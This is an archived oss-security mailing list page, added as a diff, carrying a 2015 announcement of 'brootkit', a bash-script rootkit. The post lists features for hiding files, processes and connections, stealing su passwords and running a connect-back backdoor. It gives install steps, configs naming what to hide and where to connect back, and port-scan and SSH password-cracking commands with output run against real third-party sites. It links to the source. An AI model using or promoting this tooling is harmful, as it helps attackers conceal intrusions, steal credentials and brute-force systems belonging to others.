@@ -1,0 +1,281 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - New Rootkit - Lightweight rootkit implemented by bash shell scripts v0.10</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="5">[&lt;prev]</a> <a href="7">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CAEQi4bf0RO9HymKJhD5M9c0wDv2ZhOwG86hU6JFdsOpKwowd6Q&#64;mail.gmail.com&gt;
+Date: Sat, 28 Mar 2015 19:36:05 +0800
+From: wzt wzt &lt;wzt.wzt&#64;...il.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Subject: New Rootkit - Lightweight rootkit implemented by bash shell scripts v0.10
+
+BROOTKIT
+    Lightweight rootkit implemented by bash shell scripts v0.10
+
+    by wzt 2015   wzt.wzt&#64;...il.com
+
+    If bash shell scripts can be designed for security tools like chkrootkit
+    or rkhunter, so it can be implemented for a rootkit.
+
+FEATURES
+    1. more hidable ability against admintrator or hids.
+    2. su passwd thief.
+    3. hide file and directorys.
+    4. hide process.
+    5. hide network connections.
+    6. connect backdoor.
+    7. multi thread port scanner.
+    8. http download.
+    9. multi thread ssh passwd crack.
+
+TARGET OS
+    1. centos
+    2. rhel
+    3. ubuntu
+    4. debian
+    5. fedroa
+    6. freebsd
+
+TODO
+    1. sudo thief support.
+
+INSTALL
+
+    Linux distribution systems.
+
+    1. edit br.conf first
+
+      brootkit config file.
+
+      #the ports will be hide: port1,port2,...,portn.
+      HIDE_PORT               8080,8899
+      #the files will be hide: file1,file2,...,filen.
+      HIDE_FILE               br.conf,bashbd.sh,brootkit,.bdrc,brdaemon
+      #the process will be hide: process1,process2,...,processn.
+      HIDE_PROC               bashbd,brootkit,pty.spawn,brdaemon
+      #the connect back host domain name or ip address.
+      REMOTE_HOST             localhost
+      #the connect back host port.
+      REMOTE_PORT             8080
+      #the connect backdoor base sleep time.
+      SLEEP_TIME              60
+    2. ./install.sh
+
+    3. multi thread port scanner.
+
+      [root&#64;...alhost brootkit]$ ./brscan.sh
+      ./brscan.sh &lt;-p&gt; [-n|-t|-o|-h] &lt;remote_host&gt;
+
+      option:
+      -p              ports, pattern: port1,port2,port3-port7,portn...
+      -n              thread num, defalut is 10
+      -t              timeout, default is 30s
+      -o              results write into log file, default is brscan.log
+      -h              help information.
+
+      exp:
+      ./brscan.sh -p 21,22,23-25,80,135-139,8080 -t 20 www.cloud-sec.org
+      ./brscan.sh -p 1-65525 -n 200 -t 20 www.cloud-sec.org
+
+      [root&#64;...alhost brootkit]# ./brscan.sh -p 21,22,23-25,80,135-139,8080
+-t 5 -n 20 www.wooyun.org
+      host: www.wooyun.org | total ports: 10 | thread num: 10 timeout: 5 |
+logfile: brscan.log
+
+      thread&lt;0    &gt;           --              pid &lt;57053&gt;     --&gt;     21
+      thread&lt;1    &gt;           --              pid &lt;57054&gt;     --&gt;     22
+      thread&lt;2    &gt;           --              pid &lt;57055&gt;     --&gt;     23
+      thread&lt;3    &gt;           --              pid &lt;57056&gt;     --&gt;     24
+      thread&lt;4    &gt;           --              pid &lt;57057&gt;     --&gt;     80
+      thread&lt;5    &gt;           --              pid &lt;57058&gt;     --&gt;     135
+      thread&lt;6    &gt;           --              pid &lt;57059&gt;     --&gt;     136
+      thread&lt;7    &gt;           --              pid &lt;57060&gt;     --&gt;     137
+      thread&lt;8    &gt;           --              pid &lt;57061&gt;     --&gt;     138
+      thread&lt;9    &gt;           --              pid &lt;57070&gt;     --&gt;     8080
+
+      [&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;]
+10/10     6 s
+
+    www.wooyun.org: 80
+
+    4. multi thread ssh passwd crack.
+      [root&#64;...alhost brootkit]# ./sshcrack.sh
+      ./sshcrack.sh &lt;-h host&gt; &lt;-u user&gt; &lt;-p passwd&gt; [-t timeout] [-n
+threadnum] [-o logfile]
+
+      option:
+      -h              host name or host list file.
+      -u              user name or user list file.
+      -p              single passwd or passwd list file.
+      -t              connect timeout, defalut is 5s.
+      -n              thread num, default is 1.
+      -o              log file.
+      -v              display help information.
+
+      exp:
+
+      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst
+      ./sshcrack.sh -h 192.168.215.148 -u wzt -p passwd.lst -n 10 -t 2
+      ./sshcrack.sh -h 192.168.215.148 -u user.lst -p passwd.lst -n 10 -t 2
+      ./sshcrack.sh -h host.lst -u user.lst -p passwd.lst -n 10 -t 2
+
+      [root&#64;...alhost brootkit]# ./sshcrack.sh -h 192.168.215.148 -u wzt -p
+passwd.lst -n 6
+      host: 1 | users: 1 | passwd: 28 thread: 6 | timeout: 10 | logfile:
+sshcrack.log
+
+      Thread[ 1]      wzt&#64;....168.215.148             ==&gt;     [e
+    ]      [failed]         3
+      Thread[ 2]      wzt&#64;....168.215.148             ==&gt;     [a
+    ]      [failed]         3
+      Thread[ 3]      wzt&#64;....168.215.148             ==&gt;     [d
+    ]      [failed]         3
+      Thread[ 4]      wzt&#64;....168.215.148             ==&gt;     [giveshell
+ ]      [success]     6
+      Thread[ 5]      wzt&#64;....168.215.148             ==&gt;     [123456
+ ]      [failed]         3
+      Thread[ 6]      wzt&#64;....168.215.148             ==&gt;     [fd
+   ]      [failed]         3
+
+      waiting all threads to finsh...
+
+    Freebsd system
+    on the modern freebsd system, root use csh by default, the other users
+    use sh default. this version brootkit can only support sh based
+features.
+
+    1. edit brsh.conf first
+
+    brshootkit config file, only one argument support.
+
+      #the port will be hide.
+      HIDE_PORT               8080
+      #the files will be hide file.
+      HIDE_FILE               brsh
+      #the process will be hide process.
+      HIDE_PROC               sh
+      #the connect back host domain name or ip address.
+      REMOTE_HOST             localhost
+      #the connect back host port.
+      REMOTE_PORT             8080
+      #the connect backdoor base sleep time.
+      SLEEP_TIME              60
+    2. ./install.sh
+
+SOURCE
+    <a href="https://github.com/cloudsec/brootkit" rel="nofollow">https://github.com/cloudsec/brootkit</a>
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
